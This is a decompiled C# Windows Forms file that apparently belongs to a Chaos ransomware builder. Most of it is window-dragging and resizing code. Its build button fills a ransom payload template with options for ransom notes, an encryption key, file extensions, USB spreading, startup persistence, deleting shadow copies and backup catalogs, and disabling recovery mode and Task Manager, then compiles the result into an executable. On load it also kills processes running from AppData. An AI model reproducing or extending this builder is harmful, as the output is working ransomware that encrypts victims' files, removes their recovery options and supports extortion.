using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Ryuk.Net;
using Chaos_Ransomware.Properties;

namespace CustomWindowsForm
{
	// Token: 0x02000003 RID: 3
	public partial class BlackForm : Form
	{
		// Token: 0x0600001E RID: 30 RVA: 0x00003B80 File Offset: 0x00001D80
		public BlackForm()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003C00 File Offset: 0x00001E00
		private void BlackForm_Load(object sender, EventArgs e)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.MainModule.FileName.Contains(folderPath))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003C7C File Offset: 0x00001E7C
		private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isTopBorderPanelDragged = true;
			}
			else
			{
				this.isTopBorderPanelDragged = false;
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003CB4 File Offset: 0x00001EB4
		private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Y < base.Location.Y)
			{
				if (this.isTopBorderPanelDragged)
				{
					if (base.Height < 50)
					{
						base.Height = 50;
						this.isTopBorderPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
						base.Height -= e.Y;
					}
				}
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003D5A File Offset: 0x00001F5A
		private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isTopBorderPanelDragged = false;
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003D64 File Offset: 0x00001F64
		private void TopPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isTopPanelDragged = true;
				Point point = base.PointToScreen(new Point(e.X, e.Y));
				this.offset = default(Point);
				this.offset.X = base.Location.X - point.X;
				this.offset.Y = base.Location.Y - point.Y;
			}
			else
			{
				this.isTopPanelDragged = false;
			}
			if (e.Clicks == 2)
			{
				this.isTopPanelDragged = false;
				this._MaxButton_Click(sender, e);
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003E24 File Offset: 0x00002024
		private void TopPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isTopPanelDragged)
			{
				Point point = this.TopPanel.PointToScreen(new Point(e.X, e.Y));
				point.Offset(this.offset);
				base.Location = point;
				if (base.Location.X > 2 || base.Location.Y > 2)
				{
					if (base.WindowState == FormWindowState.Maximized)
					{
						base.Location = this._normalWindowLocation;
						base.Size = this._normalWindowSize;
						this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
						this.isWindowMaximized = false;
					}
				}
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003EE8 File Offset: 0x000020E8
		private void TopPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isTopPanelDragged = false;
			if (base.Location.Y <= 5)
			{
				if (!this.isWindowMaximized)
				{
					this._normalWindowSize = base.Size;
					this._normalWindowLocation = base.Location;
					Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
					base.Location = new Point(0, 0);
					base.Size = new Size(workingArea.Width, workingArea.Height);
					this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
					this.isWindowMaximized = true;
				}
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00003F80 File Offset: 0x00002180
		private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (base.Location.X <= 0 || e.X < 0)
			{
				this.isLeftPanelDragged = false;
				base.Location = new Point(10, base.Location.Y);
			}
			else if (e.Button == MouseButtons.Left)
			{
				this.isLeftPanelDragged = true;
			}
			else
			{
				this.isLeftPanelDragged = false;
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00004004 File Offset: 0x00002204
		private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.X < base.Location.X)
			{
				if (this.isLeftPanelDragged)
				{
					if (base.Width < 100)
					{
						base.Width = 100;
						this.isLeftPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X + e.X, base.Location.Y);
						base.Width -= e.X;
					}
				}
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x000040AA File Offset: 0x000022AA
		private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isLeftPanelDragged = false;
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000040B4 File Offset: 0x000022B4
		private void RightPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isRightPanelDragged = true;
			}
			else
			{
				this.isRightPanelDragged = false;
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000040EC File Offset: 0x000022EC
		private void RightPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isRightPanelDragged)
			{
				if (base.Width < 100)
				{
					base.Width = 100;
					this.isRightPanelDragged = false;
				}
				else
				{
					base.Width += e.X;
				}
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00004144 File Offset: 0x00002344
		private void RightPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isRightPanelDragged = false;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00004150 File Offset: 0x00002350
		private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isBottomPanelDragged = true;
			}
			else
			{
				this.isBottomPanelDragged = false;
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00004188 File Offset: 0x00002388
		private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isBottomPanelDragged)
			{
				if (base.Height < 50)
				{
					base.Height = 50;
					this.isBottomPanelDragged = false;
				}
				else
				{
					base.Height += e.Y;
				}
			}
		}

		// Token: 0x0600002E RID: 46 RVA: 0x000041E0 File Offset: 0x000023E0
		private void BottomPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isBottomPanelDragged = false;
		}

		// Token: 0x0600002F RID: 47 RVA: 0x000041EA File Offset: 0x000023EA
		private void _MinButton_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000041F8 File Offset: 0x000023F8
		private void _MaxButton_Click(object sender, EventArgs e)
		{
			if (this.isWindowMaximized)
			{
				base.Location = this._normalWindowLocation;
				base.Size = this._normalWindowSize;
				this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
				this.isWindowMaximized = false;
			}
			else
			{
				this._normalWindowSize = base.Size;
				this._normalWindowLocation = base.Location;
				Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
				base.Location = new Point(0, 0);
				base.Size = new Size(workingArea.Width, workingArea.Height);
				this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
				this.isWindowMaximized = true;
			}
		}

		// Token: 0x06000031 RID: 49 RVA: 0x000042A6 File Offset: 0x000024A6
		private void _CloseButton_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000042B0 File Offset: 0x000024B0
		private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isRightBottomPanelDragged = true;
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000042BC File Offset: 0x000024BC
		private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isRightBottomPanelDragged)
			{
				if (base.Width < 100 || base.Height < 50)
				{
					base.Width = 100;
					base.Height = 50;
					this.isRightBottomPanelDragged = false;
				}
				else
				{
					base.Width += e.X;
					base.Height += e.Y;
				}
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x0000433F File Offset: 0x0000253F
		private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isRightBottomPanelDragged = false;
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00004349 File Offset: 0x00002549
		private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.RightBottomPanel_1_MouseDown(sender, e);
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00004355 File Offset: 0x00002555
		private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.RightBottomPanel_1_MouseMove(sender, e);
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00004361 File Offset: 0x00002561
		private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.RightBottomPanel_1_MouseUp(sender, e);
		}

		// Token: 0x06000038 RID: 56 RVA: 0x0000436D File Offset: 0x0000256D
		private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isLeftBottomPanelDragged = true;
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00004378 File Offset: 0x00002578
		private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.X < base.Location.X)
			{
				if (this.isLeftBottomPanelDragged || base.Height < 50)
				{
					if (base.Width < 100)
					{
						base.Width = 100;
						base.Height = 50;
						this.isLeftBottomPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X + e.X, base.Location.Y);
						base.Width -= e.X;
						base.Height += e.Y;
					}
				}
			}
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00004451 File Offset: 0x00002651
		private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isLeftBottomPanelDragged = false;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x0000445B File Offset: 0x0000265B
		private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.LeftBottomPanel_1_MouseDown(sender, e);
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00004467 File Offset: 0x00002667
		private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.LeftBottomPanel_1_MouseMove(sender, e);
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00004473 File Offset: 0x00002673
		private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.LeftBottomPanel_1_MouseUp(sender, e);
		}

		// Token: 0x0600003E RID: 62 RVA: 0x0000447F File Offset: 0x0000267F
		private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isRightTopPanelDragged = true;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000448C File Offset: 0x0000268C
		private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Y < base.Location.Y || e.X < base.Location.X)
			{
				if (this.isRightTopPanelDragged)
				{
					if (base.Height < 50 || base.Width < 100)
					{
						base.Height = 50;
						base.Width = 100;
						this.isRightTopPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
						base.Height -= e.Y;
						base.Width += e.X;
					}
				}
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x0000457D File Offset: 0x0000277D
		private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isRightTopPanelDragged = false;
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00004587 File Offset: 0x00002787
		private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.RightTopPanel_1_MouseDown(sender, e);
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00004593 File Offset: 0x00002793
		private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.RightTopPanel_1_MouseMove(sender, e);
		}

		// Token: 0x06000043 RID: 67 RVA: 0x0000459F File Offset: 0x0000279F
		private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.RightTopPanel_1_MouseUp(sender, e);
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000045AB File Offset: 0x000027AB
		private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isLeftTopPanelDragged = true;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000045B8 File Offset: 0x000027B8
		private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.X < base.Location.X || e.Y < base.Location.Y)
			{
				if (this.isLeftTopPanelDragged)
				{
					if (base.Width < 100 || base.Height < 50)
					{
						base.Width = 100;
						base.Height = 100;
						this.isLeftTopPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X + e.X, base.Location.Y);
						base.Width -= e.X;
						base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
						base.Height -= e.Y;
					}
				}
			}
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000046DB File Offset: 0x000028DB
		private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isLeftTopPanelDragged = false;
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000046E5 File Offset: 0x000028E5
		private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.LeftTopPanel_1_MouseDown(sender, e);
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000046F1 File Offset: 0x000028F1
		private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.LeftTopPanel_1_MouseMove(sender, e);
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000046FD File Offset: 0x000028FD
		private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.LeftTopPanel_1_MouseUp(sender, e);
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00004709 File Offset: 0x00002909
		private void file_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004B RID: 75 RVA: 0x0000470C File Offset: 0x0000290C
		private void edit_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004C RID: 76 RVA: 0x0000470F File Offset: 0x0000290F
		private void view_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00004712 File Offset: 0x00002912
		private void run_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00004715 File Offset: 0x00002915
		private void help_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00004718 File Offset: 0x00002918
		private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e)
		{
			this.TopPanel_MouseDown(sender, e);
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00004724 File Offset: 0x00002924
		private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e)
		{
			this.TopPanel_MouseMove(sender, e);
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004730 File Offset: 0x00002930
		private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e)
		{
			this.TopPanel_MouseUp(sender, e);
		}

		// Token: 0x06000052 RID: 82 RVA: 0x0000473C File Offset: 0x0000293C
		private void shapedButton3_Click(object sender, EventArgs e)
		{
			Form2 form = new Form2();
			form.ShowDialog();
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00004758 File Offset: 0x00002958
		private void shapedButton4_Click(object sender, EventArgs e)
		{
			if (this.textBox1.Text.Trim().Length < 1)
			{
				MessageBox.Show("Please type your message!", "Read_it.txt", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else if (string.IsNullOrWhiteSpace("aa"))
			{
				MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < this.textBox1.Lines.Length; i++)
				{
					stringBuilder.Append("\"" + this.textBox1.Lines[i] + "\",\n");
				}
				string text = Encoding.UTF8.GetString(Resources.Source);
				text = text.Replace("#messages", stringBuilder.ToString());
				if (this.checkBox1.Checked)
				{
					text = text.Replace("#encryptedFileExtension", "");
				}
				else
				{
					string text2 = this.textBox2.Text;
					if (text2.Contains("."))
					{
						text2 = text2.Replace(".", "");
					}
					text = text.Replace("#encryptedFileExtension", text2);
				}
				if (this.checkBox2.Checked)
				{
					if (this.textBox4.Text.Trim().Length < 1)
					{
						MessageBox.Show("Proccess name field is empty");
						return;
					}
					if (this.textBox4.Text.EndsWith(".exe"))
					{
						text = text.Replace("#copyRoaming", "true");
						text = text.Replace("#exeName", this.textBox4.Text);
					}
					else
					{
						text = text.Replace("#copyRoaming", "true");
						text = text.Replace("#exeName", this.textBox4.Text + ".exe");
					}
				}
				else
				{
					text = text.Replace("#copyRoaming", "false");
					text = text.Replace("#exeName", this.textBox4.Text);
				}
				if (this.usbSpreadCheckBox.Checked)
				{
					if (this.spreadNameText.Text.Trim().Length < 1)
					{
						MessageBox.Show("Usb spread name field is empty");
						return;
					}
					if (this.spreadNameText.Text.EndsWith(".exe"))
					{
						text = text.Replace("#checkSpread", "true");
						text = text.Replace("#spreadName", this.spreadNameText.Text);
					}
					else
					{
						text = text.Replace("#checkSpread", "true");
						text = text.Replace("#spreadName", this.spreadNameText.Text + ".exe");
					}
				}
				else
				{
					text = text.Replace("#checkSpread", "false");
					text = text.Replace("#spreadName", this.spreadNameText.Text);
				}
				if (this.startupcheckBox3.Checked)
				{
					text = text.Replace("#startupFolder", "true");
				}
				else
				{
					text = text.Replace("#startupFolder", "true");
				}
				if (this.sleepCheckBox.Checked)
				{
					text = text.Replace("#checkSleep", "true");
					text = text.Replace("#sleepTextbox", this.SleepTextBox.Text);
				}
				else
				{
					text = text.Replace("#checkSleep", "false");
					text = text.Replace("#sleepTextbox", this.SleepTextBox.Text);
				}
				if (Settings.Default.checkAdminPrivilage)
				{
					text = text.Replace("#adminPrivilage", "true");
				}
				else
				{
					text = text.Replace("#adminPrivilage", "false");
				}
				if (Settings.Default.deleteBackupCatalog)
				{
					text = text.Replace("#checkdeleteBackupCatalog", "true");
				}
				else
				{
					text = text.Replace("#checkdeleteBackupCatalog", "false");
				}
				if (Settings.Default.deleteShadowCopies)
				{
					text = text.Replace("#checkdeleteShadowCopies", "true");
				}
				else
				{
					text = text.Replace("#checkdeleteShadowCopies", "false");
				}
				if (Settings.Default.disableRecoveryMode)
				{
					text = text.Replace("#checkdisableRecoveryMode", "true");
				}
				else
				{
					text = text.Replace("#checkdisableRecoveryMode", "false");
				}
				if (Settings.Default.disableTaskManager)
				{
					text = text.Replace("#checkdisableTaskManager", "true");
				}
				else
				{
					text = text.Replace("#checkdisableTaskManager", "false");
				}
				if (this.droppedMessageTextbox.Text.Trim().Length < 1)
				{
					MessageBox.Show("Dropped message name field is empty");
				}
				else
				{
					text = text.Replace("#droppedMessageTextbox", this.droppedMessageTextbox.Text);
					string publicKey = Settings.Default.publicKey;
					bool encryptOption = Settings.Default.encryptOption;
					if (encryptOption)
					{
						if (!(publicKey != ""))
						{
							MessageBox.Show("Decrypter name field is empty. Go to advanced option and create or select decrypter", "Advanced Option");
							return;
						}
						using (StringReader stringReader = new StringReader(publicKey))
						{
							StringBuilder stringBuilder2 = new StringBuilder();
							string text3;
							while ((text3 = stringReader.ReadLine()) != null)
							{
								string text4 = text3.Replace("\"", "\\\"");
								stringBuilder2.AppendLine("pubclicKey.AppendLine(\"" + text4 + "\");");
							}
							text = text.Replace("#encryptOption", "true");
							text = text.Replace("#publicKey", stringBuilder2.ToString());
						}
					}
					else
					{
						text = text.Replace("#encryptOption", "false");
						text = text.Replace("#publicKey", "");
					}
					if (Settings.Default.base64Image != "")
					{
						text = text.Replace("#base64Image", Settings.Default.base64Image);
					}
					if (Settings.Default.extensions != "")
					{
						text = text.Replace("#extensions", Settings.Default.extensions);
					}
					using (SaveFileDialog saveFileDialog = new SaveFileDialog())
					{
						saveFileDialog.Filter = "Executable (*.exe)|*.exe";
						if (saveFileDialog.ShowDialog() == DialogResult.OK)
						{
							new Compiler(text, saveFileDialog.FileName, this.iconLocation);
						}
					}
				}
			}
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00004E8C File Offset: 0x0000308C
		private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00004E8F File Offset: 0x0000308F
		private void panel2_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00004E94 File Offset: 0x00003094
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.textBox2.Enabled)
			{
				this.textBox2.Enabled = true;
			}
			else
			{
				this.textBox2.Enabled = false;
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00004ED4 File Offset: 0x000030D4
		private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.spreadNameText.Enabled)
			{
				this.spreadNameText.Enabled = true;
			}
			else
			{
				this.spreadNameText.Enabled = false;
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00004F14 File Offset: 0x00003114
		private void checkBox2_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.textBox4.Enabled)
			{
				this.textBox4.Enabled = true;
			}
			else
			{
				this.textBox4.Enabled = false;
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00004F51 File Offset: 0x00003151
		private void button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00004F54 File Offset: 0x00003154
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Icons (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.iconLocation = openFileDialog.FileName;
					this.pictureBox1.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
					this.selectIconLabel.Text = "";
				}
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00004FF4 File Offset: 0x000031F4
		private void selectIconLabel_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Icons (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.iconLocation = openFileDialog.FileName;
					this.pictureBox1.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
					this.selectIconLabel.Text = "";
				}
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00005094 File Offset: 0x00003294
		private void checkBox3_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.SleepTextBox.Enabled)
			{
				this.SleepTextBox.Enabled = true;
			}
			else
			{
				this.SleepTextBox.Enabled = false;
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000050D4 File Offset: 0x000032D4
		private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
		{
			if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
			{
				e.Handled = true;
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x0000510C File Offset: 0x0000330C
		private void shapedButton1_Click(object sender, EventArgs e)
		{
			advancedSettingForm advancedSettingForm = new advancedSettingForm();
			advancedSettingForm.ShowDialog();
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00005127 File Offset: 0x00003327
		private void textBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000060 RID: 96 RVA: 0x0000512A File Offset: 0x0000332A
		private void textBox1_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000061 RID: 97 RVA: 0x0000512D File Offset: 0x0000332D
		private void TopPanel_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00005130 File Offset: 0x00003330
		private void shapedButton2_Click(object sender, EventArgs e)
		{
			extensions extensions = new extensions();
			extensions.ShowDialog();
		}

		// Token: 0x04000017 RID: 23
		private bool isTopPanelDragged = false;

		// Token: 0x04000018 RID: 24
		private bool isLeftPanelDragged = false;

		// Token: 0x04000019 RID: 25
		private bool isRightPanelDragged = false;

		// Token: 0x0400001A RID: 26
		private bool isBottomPanelDragged = false;

		// Token: 0x0400001B RID: 27
		private bool isTopBorderPanelDragged = false;

		// Token: 0x0400001C RID: 28
		private bool isRightBottomPanelDragged = false;

		// Token: 0x0400001D RID: 29
		private bool isLeftBottomPanelDragged = false;

		// Token: 0x0400001E RID: 30
		private bool isRightTopPanelDragged = false;

		// Token: 0x0400001F RID: 31
		private bool isLeftTopPanelDragged = false;

		// Token: 0x04000020 RID: 32
		private bool isWindowMaximized = false;

		// Token: 0x04000021 RID: 33
		private Point offset;

		// Token: 0x04000022 RID: 34
		private Size _normalWindowSize;

		// Token: 0x04000023 RID: 35
		private Point _normalWindowLocation = Point.Empty;

		// Token: 0x04000024 RID: 36
		private string iconLocation = "";
	}
}
